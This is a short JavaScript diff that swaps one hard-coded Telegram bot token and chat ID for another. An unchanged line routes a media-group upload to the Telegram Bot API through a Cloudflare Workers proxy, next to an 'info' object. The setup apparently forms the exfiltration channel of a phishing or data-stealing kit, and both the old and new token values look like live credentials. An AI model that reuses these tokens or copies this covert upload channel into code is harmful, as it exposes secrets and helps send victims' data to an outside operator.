@@ -1,5 +1,5 @@
-const TELEGRAM_BOT_TOKEN = '7731248083:AAFSbM3YKJuWb3kwqAQg1OGmySjf9mUFTaw';
-const TELEGRAM_CHAT_ID = '6502310633';
+const TELEGRAM_BOT_TOKEN = '8079495812:AAHYPkw0DXkR5rCb_Fv9ijPdacG0uG_F6Gs';
+const TELEGRAM_CHAT_ID = '5771150172';
 const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 
 const info = {
